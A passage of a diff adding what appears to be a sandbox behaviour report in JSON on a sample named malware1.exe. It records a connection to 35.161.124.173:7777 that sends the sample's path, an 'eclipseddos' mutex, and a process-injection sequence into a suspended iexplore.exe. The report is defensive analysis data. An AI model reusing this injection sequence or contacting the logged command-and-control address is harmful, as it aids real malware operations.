+                "entropy": 5.333264031150629, 
+                "name": ".idata", 
+                "virtual_size": "0x00000f50"
+            }, 
+            {
+                "size_of_data": "0x00001200", 
+                "virtual_address": "0x00019000", 
+                "entropy": 6.568418476940903, 
+                "name": ".reloc", 
+                "virtual_size": "0x00001178"
+            }
+        ]
+    }, 
+    "behavior": {
+        "generic": [
+            {
+                "process_path": "C:\\Windows\\System32\\lsass.exe", 
+                "process_name": "lsass.exe", 
+                "pid": 484, 
+                "summary": {}, 
+                "first_seen": 1601052893.890625, 
+                "ppid": 376
+            }, 
+            {
+                "process_path": "C:\\Users\\Administrator.john-PC\\AppData\\Local\\Temp\\malware1.exe", 
+                "process_name": "malware1.exe", 
+                "pid": 2044, 
+                "summary": {
+                    "connects_ip": [
+                        "35.161.124.173"
+                    ], 
+                    "command_line": [
+                        "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"
+                    ], 
+                    "mutex": [
+                        "eclipseddos"
+                    ], 
+                    "regkey_read": [
+                        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize\\DisableMetaFiles"
+                    ]
+                }, 
+                "first_seen": 1601052895.84375, 
+                "ppid": 2112
+            }
+        ], 
+        "apistats": {
+            "2044": {
+                "NtDuplicateObject": 1, 
+                "RegCloseKey": 1, 
+                "WriteProcessMemory": 1, 
+                "WSAStartup": 1, 
+                "NtTerminateProcess": 2, 
+                "NtQueryValueKey": 1, 
+                "MessageBoxTimeoutA": 1, 
+                "CreateRemoteThread": 1, 
+                "NtClose": 19, 
+                "send": 1, 
+                "NtAllocateVirtualMemory": 2, 
+                "LdrGetDllHandle": 1, 
+                "LdrUnloadDll": 1, 
+                "NtUnmapViewOfSection": 1, 
+                "closesocket": 1, 
+                "NtCreateMutant": 1, 
+                "SHGetFolderPathW": 1, 
+                "socket": 1, 
+                "NtOpenKey": 1, 
+                "LdrGetProcedureAddress": 1, 
+                "CreateProcessInternalW": 1, 
+                "connect": 1
+            }
+        }, 
+        "processes": [
+            {
+                "process_path": "C:\\Windows\\System32\\lsass.exe", 
+                "calls": [], 
+                "track": false, 
+                "pid": 484, 
+                "process_name": "lsass.exe", 
+                "command_line": "C:\\Windows\\system32\\lsass.exe", 
+                "modules": [
+                    {
+                        "basename": "lsass.exe", 
+                        "imgsize": 49152, 
+                        "baseaddr": "0xff510000", 
+                        "filepath": "C:\\Windows\\system32\\lsass.exe"
+                    }, 
+                    {
+                        "basename": "ntdll.dll", 
+                        "imgsize": 1740800, 
+                        "baseaddr": "0x77ba0000", 
+                        "filepath": "C:\\Windows\\SYSTEM32\\ntdll.dll"
+                    }, 
+                    {
+                        "basename": "kernel32.dll", 
+                        "imgsize": 1175552, 
+                        "baseaddr": "0x77980000", 
+                        "filepath": "C:\\Windows\\system32\\kernel32.dll"
+                    }, 
+                    {
+                        "basename": "KERNELBASE.dll", 
+                        "imgsize": 438272, 
+                        "baseaddr": "0x7fefdbe0000", 
+                        "filepath": "C:\\Windows\\system32\\KERNELBASE.dll"
+                    }, 
+                    {
+                        "basename": "msvcrt.dll", 
+                        "imgsize": 651264, 
+                        "baseaddr": "0x7feff320000", 
+                        "filepath": "C:\\Windows\\system32\\msvcrt.dll"
+                    }, 
+                    {
+                        "basename": "RPCRT4.dll", 
+                        "imgsize": 1232896, 
+                        "baseaddr": "0x7feff400000", 
+                        "filepath": "C:\\Windows\\system32\\RPCRT4.dll"
+                    }, 
+                    {
+                        "basename": "SspiSrv.dll", 
+                        "imgsize": 45056, 
+                        "baseaddr": "0x7fefd940000", 
+                        "filepath": "C:\\Windows\\system32\\SspiSrv.dll"
+                    }, 
+                    {
+                        "basename": "lsasrv.dll", 
+                        "imgsize": 1470464, 
+                        "baseaddr": "0x7fefd7d0000", 
+                        "filepath": "C:\\Windows\\system32\\lsasrv.dll"
+                    }, 
+                    {
+                        "basename": "sechost.dll", 
+                        "imgsize": 126976, 
+                        "baseaddr": "0x7feffc00000", 
+                        "filepath": "C:\\Windows\\SYSTEM32\\sechost.dll"
+                    }, 
+                    {
+                        "basename": "SspiCli.dll", 
+                        "imgsize": 151552, 
+                        "baseaddr": "0x7fefd950000", 
+                        "filepath": "C:\\Windows\\system32\\SspiCli.dll"
+                    }, 
+                    {
+                        "basename": "ADVAPI32.dll", 
+                        "imgsize": 897024, 
+                        "baseaddr": "0x7feffdd0000", 
+                        "filepath": "C:\\Windows\\system32\\ADVAPI32.dll"
+                    }, 
+                    {
+                        "basename": "USER32.dll", 
+                        "imgsize": 1024000, 
+                        "baseaddr": "0x77aa0000", 
+                        "filepath": "C:\\Windows\\system32\\USER32.dll"
+                    }, 
+                    {
+                        "basename": "GDI32.dll", 
+                        "imgsize": 421888, 
+                        "baseaddr": "0x7fefe200000", 
+                        "filepath": "C:\\Windows\\system32\\GDI32.dll"
+                    }, 
+                    {
+                        "basename": "LPK.dll", 
+                        "imgsize": 57344, 
+                        "baseaddr": "0x7fefe4e0000", 
+                        "filepath": "C:\\Windows\\system32\\LPK.dll"
+                    }, 
+                    {
+                        "basename": "USP10.dll", 
+                        "imgsize": 823296, 
+                        "baseaddr": "0x7feff910000", 
+                        "filepath": "C:\\Windows\\system32\\USP10.dll"
+                    }, 
+                    {
+                        "basename": "SAMSRV.dll", 
+                        "imgsize": 774144, 
+                        "baseaddr": "0x7fefd6e0000", 
+                        "filepath": "C:\\Windows\\system32\\SAMSRV.dll"
+                    }, 
+                    {
+                        "basename": "cryptdll.dll", 
+                        "imgsize": 81920, 
+                        "baseaddr": "0x7fefd6b0000", 
+                        "filepath": "C:\\Windows\\system32\\cryptdll.dll"
+                    }, 
+                    {
+                        "basename": "MSASN1.dll", 
+                        "imgsize": 61440, 
+                        "baseaddr": "0x7fefdb90000", 
+                        "filepath": "C:\\Windows\\system32\\MSASN1.dll"
+                    }, 
+                    {
+                        "basename": "wevtapi.dll", 
+                        "imgsize": 446464, 
+                        "baseaddr": "0x7fefd630000", 
+                        "filepath": "C:\\Windows\\system32\\wevtapi.dll"
+                    }, 
+                    {
+                        "basename": "IMM32.DLL", 
+                        "imgsize": 188416, 
+                        "baseaddr": "0x7feff3d0000", 
+                        "filepath": "C:\\Windows\\system32\\IMM32.DLL"
+                    }, 
+                    {
+                        "basename": "MSCTF.dll", 
+                        "imgsize": 1085440, 
+                        "baseaddr": "0x7fefdf10000", 
+                        "filepath": "C:\\Windows\\system32\\MSCTF.dll"
+                    }, 
+                    {
+                        "basename": "cngaudit.dll", 
+                        "imgsize": 36864, 
+                        "baseaddr": "0x7fefd580000", 
+                        "filepath": "C:\\Windows\\system32\\cngaudit.dll"
+                    }, 
+                    {
+                        "basename": "AUTHZ.dll", 
+                        "imgsize": 192512, 
+                        "baseaddr": "0x7fefd530000", 
+                        "filepath": "C:\\Windows\\system32\\AUTHZ.dll"
+                    }, 
+                    {
+                        "basename": "ncrypt.dll", 
+                        "imgsize": 319488, 
+                        "baseaddr": "0x7fefd4a0000", 
+                        "filepath": "C:\\Windows\\system32\\ncrypt.dll"
+                    }, 
+                    {
+                        "basename": "bcrypt.dll", 
+                        "imgsize": 139264, 
+                        "baseaddr": "0x7fefd470000", 
+                        "filepath": "C:\\Windows\\system32\\bcrypt.dll"
+                    }, 
+                    {
+                        "basename": "msprivs.DLL", 
+                        "imgsize": 8192, 
+                        "baseaddr": "0x758c0000", 
+                        "filepath": "C:\\Windows\\system32\\msprivs.DLL"
+                    }, 
+                    {
+                        "basename": "netjoin.dll", 
+                        "imgsize": 204800, 
+                        "baseaddr": "0x7fefd4f0000", 
+                        "filepath": "C:\\Windows\\system32\\netjoin.dll"
+                    }, 
+                    {
+                        "basename": "negoexts.DLL", 
+                        "imgsize": 147456, 
+                        "baseaddr": "0x7fefd360000", 
+                        "filepath": "C:\\Windows\\system32\\negoexts.DLL"
+                    }, 
+                    {
+                        "basename": "Secur32.dll", 
+                        "imgsize": 45056, 
+                        "baseaddr": "0x7fefd6a0000", 
+                        "filepath": "C:\\Windows\\system32\\Secur32.dll"
+                    }, 
+                    {
+                        "basename": "cryptbase.dll", 
+                        "imgsize": 61440, 
+                        "baseaddr": "0x7fefd9e0000", 
+                        "filepath": "C:\\Windows\\system32\\cryptbase.dll"
+                    }, 
+                    {
+                        "basename": "kerberos.DLL", 
+                        "imgsize": 737280, 
+                        "baseaddr": "0x7fefd2a0000", 
+                        "filepath": "C:\\Windows\\system32\\kerberos.DLL"
+                    }, 
+                    {
+                        "basename": "CRYPTSP.dll", 
+                        "imgsize": 94208, 
+                        "baseaddr": "0x7fefd450000", 
+                        "filepath": "C:\\Windows\\system32\\CRYPTSP.dll"
+                    }, 
+                    {
+                        "basename": "WS2_32.dll", 
+                        "imgsize": 315392, 
+                        "baseaddr": "0x7fefdec0000", 
+                        "filepath": "C:\\Windows\\system32\\WS2_32.dll"
+                    }, 
+                    {
+                        "basename": "NSI.dll", 
+                        "imgsize": 32768, 
+                        "baseaddr": "0x7feff3c0000", 
+                        "filepath": "C:\\Windows\\system32\\NSI.dll"
+                    }, 
+                    {
+                        "basename": "mswsock.dll", 
+                        "imgsize": 348160, 
+                        "baseaddr": "0x7fefd240000", 
+                        "filepath": "C:\\Windows\\system32\\mswsock.dll"
+                    }, 
+                    {
+                        "basename": "wship6.dll", 
+                        "imgsize": 28672, 
+                        "baseaddr": "0x7fefd570000", 
+                        "filepath": "C:\\Windows\\System32\\wship6.dll"
+                    }, 
+                    {
+                        "basename": "msv1_0.DLL", 
+                        "imgsize": 331776, 
+                        "baseaddr": "0x7fefd390000", 
+                        "filepath": "C:\\Windows\\system32\\msv1_0.DLL"
+                    }, 
+                    {
+                        "basename": "netlogon.DLL", 
+                        "imgsize": 712704, 
+                        "baseaddr": "0x7fefd190000", 
+                        "filepath": "C:\\Windows\\system32\\netlogon.DLL"
+                    }, 
+                    {
+                        "basename": "DNSAPI.dll", 
+                        "imgsize": 372736, 
+                        "baseaddr": "0x7fefd130000", 
+                        "filepath": "C:\\Windows\\system32\\DNSAPI.dll"
+                    }, 
+                    {
+                        "basename": "logoncli.dll", 
+                        "imgsize": 196608, 
+                        "baseaddr": "0x7fefd420000", 
+                        "filepath": "C:\\Windows\\system32\\logoncli.dll"
+                    }, 
+                    {
+                        "basename": "schannel.DLL", 
+                        "imgsize": 356352, 
+                        "baseaddr": "0x7fefd0d0000", 
+                        "filepath": "C:\\Windows\\system32\\schannel.DLL"
+                    }, 
+                    {
+                        "basename": "CRYPT32.dll", 
+                        "imgsize": 1470464, 
+                        "baseaddr": "0x7fefdc50000", 
+                        "filepath": "C:\\Windows\\system32\\CRYPT32.dll"
+                    }, 
+                    {
+                        "basename": "wdigest.DLL", 
+                        "imgsize": 221184, 
+                        "baseaddr": "0x7fefd090000", 
+                        "filepath": "C:\\Windows\\system32\\wdigest.DLL"
+                    }, 
+                    {
+                        "basename": "rsaenh.dll", 
+                        "imgsize": 290816, 
+                        "baseaddr": "0x7fefcf20000", 
+                        "filepath": "C:\\Windows\\system32\\rsaenh.dll"
+                    }, 
+                    {
+                        "basename": "tspkg.DLL", 
+                        "imgsize": 98304, 
+                        "baseaddr": "0x7fefd400000", 
+                        "filepath": "C:\\Windows\\system32\\tspkg.DLL"
+                    }, 
+                    {
+                        "basename": "pku2u.DLL", 
+                        "imgsize": 282624, 
+                        "baseaddr": "0x7fefd040000", 
+                        "filepath": "C:\\Windows\\system32\\pku2u.DLL"
+                    }, 
+                    {
+                        "basename": "bcryptprimitives.dll", 
+                        "imgsize": 311296, 
+                        "baseaddr": "0x7fefcff0000", 
+                        "filepath": "C:\\Windows\\system32\\bcryptprimitives.dll"
+                    }, 
+                    {
+                        "basename": "RpcRtRemote.dll", 
+                        "imgsize": 81920, 
+                        "baseaddr": "0x7fefdad0000", 
+                        "filepath": "C:\\Windows\\system32\\RpcRtRemote.dll"
+                    }, 
+                    {
+                        "basename": "efslsaext.dll", 
+                        "imgsize": 73728, 
+                        "baseaddr": "0x7fefcfd0000", 
+                        "filepath": "C:\\Windows\\system32\\efslsaext.dll"
+                    }, 
+                    {
+                        "basename": "scecli.DLL", 
+                        "imgsize": 253952, 
+                        "baseaddr": "0x7fefcf90000", 
+                        "filepath": "C:\\Windows\\system32\\scecli.DLL"
+                    }, 
+                    {
+                        "basename": "credssp.dll", 
+                        "imgsize": 40960, 
+                        "baseaddr": "0x7fefd3f0000", 
+                        "filepath": "C:\\Windows\\system32\\credssp.dll"
+                    }, 
+                    {
+                        "basename": "WINSTA.dll", 
+                        "imgsize": 249856, 
+                        "baseaddr": "0x7fefda90000", 
+                        "filepath": "C:\\Windows\\system32\\WINSTA.dll"
+                    }, 
+                    {
+                        "basename": "IPHLPAPI.DLL", 
+                        "imgsize": 159744, 
+                        "baseaddr": "0x7fefb530000", 
+                        "filepath": "C:\\Windows\\system32\\IPHLPAPI.DLL"
+                    }, 
+                    {
+                        "basename": "WINNSI.DLL", 
+                        "imgsize": 45056, 
+                        "baseaddr": "0x7fefb520000", 
+                        "filepath": "C:\\Windows\\system32\\WINNSI.DLL"
+                    }, 
+                    {
+                        "basename": "netutils.dll", 
+                        "imgsize": 49152, 
+                        "baseaddr": "0x7fefb7e0000", 
+                        "filepath": "C:\\Windows\\system32\\netutils.dll"
+                    }, 
+                    {
+                        "basename": "USERENV.dll", 
+                        "imgsize": 122880, 
+                        "baseaddr": "0x7fefce30000", 
+                        "filepath": "C:\\Windows\\system32\\USERENV.dll"
+                    }, 
+                    {
+                        "basename": "profapi.dll", 
+                        "imgsize": 61440, 
+                        "baseaddr": "0x7fefdaf0000", 
+                        "filepath": "C:\\Windows\\system32\\profapi.dll"
+                    }, 
+                    {
+                        "basename": "wshtcpip.dll", 
+                        "imgsize": 28672, 
+                        "baseaddr": "0x7fefcd20000", 
+                        "filepath": "C:\\Windows\\System32\\wshtcpip.dll"
+                    }, 
+                    {
+                        "basename": "dssenh.dll", 
+                        "imgsize": 204800, 
+                        "baseaddr": "0x7fef4dc0000", 
+                        "filepath": "C:\\Windows\\system32\\dssenh.dll"
+                    }, 
+                    {
+                        "basename": "GPAPI.dll", 
+                        "imgsize": 110592, 
+                        "baseaddr": "0x7fefce10000", 
+                        "filepath": "C:\\Windows\\system32\\GPAPI.dll"
+                    }, 
+                    {
+                        "basename": "cryptnet.dll", 
+                        "imgsize": 155648, 
+                        "baseaddr": "0x7fef4d90000", 
+                        "filepath": "C:\\Windows\\system32\\cryptnet.dll"
+                    }, 
+                    {
+                        "basename": "WLDAP32.dll", 
+                        "imgsize": 335872, 
+                        "baseaddr": "0x7fefe480000", 
+                        "filepath": "C:\\Windows\\system32\\WLDAP32.dll"
+                    }, 
+                    {
+                        "basename": "pstorsvc.dll", 
+                        "imgsize": 53248, 
+                        "baseaddr": "0x7fefac90000", 
+                        "filepath": "C:\\Windows\\system32\\pstorsvc.dll"
+                    }, 
+                    {
+                        "basename": "psbase.dll", 
+                        "imgsize": 69632, 
+                        "baseaddr": "0x7fefab50000", 
+                        "filepath": "C:\\Windows\\system32\\psbase.dll"
+                    }, 
+                    {
+                        "basename": "monitor-x64.dll", 
+                        "imgsize": 2269184, 
+                        "baseaddr": "0x744b0000", 
+                        "filepath": "C:\\tmpegc405\\bin\\monitor-x64.dll"
+                    }
+                ], 
+                "time": 32, 
+                "tid": 2560, 
+                "first_seen": 1601052893.890625, 
+                "ppid": 376, 
+                "type": "process"
+            }, 
+            {
+                "process_path": "C:\\Users\\Administrator.john-PC\\AppData\\Local\\Temp\\malware1.exe", 
+                "calls": [
+                    {
+                        "category": "ui", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "MessageBoxTimeoutA", 
+                        "return_value": 1, 
+                        "arguments": {
+                            "window_handle": "0x00000000", 
+                            "text": "", 
+                            "caption": "", 
+                            "flags": 0, 
+                            "language_identifier": 0
+                        }, 
+                        "time": 1601052898.74975, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "network", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "WSAStartup", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "wVersionRequested": 514
+                        }, 
+                        "time": 1601052898.78075, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "network", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "socket", 
+                        "return_value": 248, 
+                        "arguments": {
+                            "protocol": 6, 
+                            "socket": 248, 
+                            "af": 2, 
+                            "type": 1
+                        }, 
+                        "time": 1601052898.82775, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "network", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "connect", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "ip_address": "35.161.124.173", 
+                            "socket": 248, 
+                            "port": 7777
+                        }, 
+                        "time": 1601052899.17175, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "network", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "send", 
+                        "return_value": 62, 
+                        "arguments": {
+                            "buffer": "C:\\Users\\Administrator.john-PC\\AppData\\Local\\Temp\\malware1.exe", 
+                            "socket": 248, 
+                            "sent": 62
+                        }, 
+                        "time": 1601052899.17175, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "network", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "closesocket", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "socket": 248
+                        }, 
+                        "time": 1601052899.17175, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "synchronisation", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtCreateMutant", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "initial_owner": 0, 
+                            "desired_access": "0x001f0001", 
+                            "mutant_name": "eclipseddos", 
+                            "mutant_handle": "0x000000f8"
+                        }, 
+                        "time": 1601052899.17175, 
+                        "tid": 2248, 
+                        "flags": {
+                            "desired_access": "STANDARD_RIGHTS_ALL|STANDARD_RIGHTS_REQUIRED|DELETE|READ_CONTROL|WRITE_DAC|WRITE_OWNER|SYNCHRONIZE"
+                        }
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "LdrGetDllHandle", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "module_name": "kernel32.dll", 
+                            "stack_pivoted": 0, 
+                            "module_address": "0x75a00000"
+                        }, 
+                        "time": 1601052899.17175, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "LdrGetProcedureAddress", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "ordinal": 0, 
+                            "module": "kernel32", 
+                            "module_address": "0x75a00000", 
+                            "function_address": "0x75a1195e", 
+                            "function_name": "IsWow64Process"
+                        }, 
+                        "time": 1601052899.17175, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "misc", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "SHGetFolderPathW", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "token_handle": "0x00000000", 
+                            "dirpath_r": "C:\\Program Files (x86)", 
+                            "flags": 0, 
+                            "owner_handle": "0x00000000", 
+                            "dirpath": "C:\\Program Files (x86)", 
+                            "folder": 42
+                        }, 
+                        "time": 1601052899.20275, 
+                        "tid": 2248, 
+                        "flags": {
+                            "folder": "CSIDL_PROGRAM_FILESX86"
+                        }
+                    }, 
+                    {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "CreateProcessInternalW", 
+                        "return_value": 1, 
+                        "arguments": {
+                            "thread_identifier": 1364, 
+                            "thread_handle": "0x00000104", 
+                            "process_identifier": 2800, 
+                            "current_directory": "", 
+                            "filepath": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe", 
+                            "track": 1, 
+                            "command_line": "", 
+                            "filepath_r": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe", 
+                            "stack_pivoted": 0, 
+                            "creation_flags": 4, 
+                            "process_handle": "0x00000108", 
+                            "inherit_handles": 1
+                        }, 
+                        "time": 1601052899.57775, 
+                        "tid": 2248, 
+                        "flags": {
+                            "creation_flags": "CREATE_SUSPENDED"
+                        }
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtDuplicateObject", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle_attributes": 0, 
+                            "source_process_identifier": 2044, 
+                            "source_handle": "0x000000f8", 
+                            "target_process_identifier": 2800, 
+                            "desired_access": "0x00000000", 
+                            "target_process_handle": "0x00000108", 
+                            "target_handle": "0x00000004", 
+                            "source_process_handle": "0xffffffff", 
+                            "options": 2
+                        }, 
+                        "time": 1601052899.57775, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtAllocateVirtualMemory", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "process_identifier": 2800, 
+                            "region_size": 110592, 
+                            "stack_dep_bypass": 0, 
+                            "stack_pivoted": 0, 
+                            "heap_dep_bypass": 0, 
+                            "protection": 64, 
+                            "process_handle": "0x00000108", 
+                            "allocation_type": 12288, 
+                            "base_address": "0x000a0000"
+                        }, 
+                        "time": 1601052899.57775, 
+                        "tid": 2248, 
+                        "flags": {
+                            "protection": "PAGE_EXECUTE_READWRITE", 
+                            "allocation_type": "MEM_COMMIT|MEM_RESERVE"
+                        }
+                    }, 
+                    {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtAllocateVirtualMemory", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "process_identifier": 2044, 
+                            "region_size": 114688, 
+                            "stack_dep_bypass": 0, 
+                            "stack_pivoted": 0, 
+                            "heap_dep_bypass": 0, 
+                            "protection": 4, 
+                            "process_handle": "0xffffffff", 
+                            "allocation_type": 4096, 
+                            "base_address": "0x002ba000"
+                        }, 
+                        "time": 1601052899.57775, 
+                        "tid": 2248, 
+                        "flags": {
+                            "protection": "PAGE_READWRITE", 
+                            "allocation_type": "MEM_COMMIT"
+                        }
+                    }, 
+                    {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "buffer": "c806923cd74e6e61a5acf8fdc7eb23efce7a0fa0", 
+                        "api": "WriteProcessMemory", 
+                        "return_value": 1, 
+                        "arguments": {
+                            "process_identifier": 2800, 
+                            "buffer": "", 
+                            "process_handle": "0x00000108", 
+                            "base_address": "0x000a0000"
+                        }, 
+                        "time": 1601052899.57775, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "CreateRemoteThread", 
+                        "return_value": 272, 
+                        "arguments": {
+                            "thread_identifier": 0, 
+                            "process_identifier": 2800, 
+                            "function_address": "0x000a6d30", 
+                            "flags": 0, 
+                            "process_handle": "0x00000108", 
+                            "parameter": "0x00000000", 
+                            "stack_size": 0
+                        }, 
+                        "time": 1601052899.59375, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "process", 
+                        "status": 0, 
+                        "stacktrace": [], 
+                        "last_error": 1813, 
+                        "nt_status": -1073741686, 
+                        "api": "NtTerminateProcess", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "status_code": "0x00000000", 
+                            "process_identifier": 0, 
+                            "process_handle": "0x00000000"
+                        }, 
+                        "time": 1601052899.59375, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtTerminateProcess", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "status_code": "0x00000000", 
+                            "process_identifier": 0, 
+                            "process_handle": "0x00000000"
+                        }, 
+                        "time": 1601052899.59375, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x000000bc"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x000000b8"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x00000048"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 0, 
+                        "stacktrace": [], 
+                        "last_error": 0, 
+                        "nt_status": -1073741686, 
+                        "api": "NtClose", 
+                        "return_value": 3221225480, 
+                        "arguments": {
+                            "handle": "0x00000000"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 0, 
+                        "stacktrace": [], 
+                        "last_error": 6, 
+                        "nt_status": -1073741816, 
+                        "api": "NtClose", 
+                        "return_value": 3221225480, 
+                        "arguments": {
+                            "handle": "0x00000000"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 0, 
+                        "stacktrace": [], 
+                        "last_error": 6, 
+                        "nt_status": -1073741816, 
+                        "api": "NtClose", 
+                        "return_value": 3221225480, 
+                        "arguments": {
+                            "handle": "0x00000000"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x00000078"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "registry", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "RegCloseKey", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "key_handle": "0x00000100"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x00000070"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x00000064"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x00000068"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x0000006c"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x00000074"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtUnmapViewOfSection", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "process_identifier": 2044, 
+                            "region_size": 4096, 
+                            "process_handle": "0xffffffff", 
+                            "base_address": "0x01c30000"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x000000fc"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x00000060"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x0000005c"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "LdrUnloadDll", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "library": "IMM32", 
+                            "module_address": "0x76140000"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
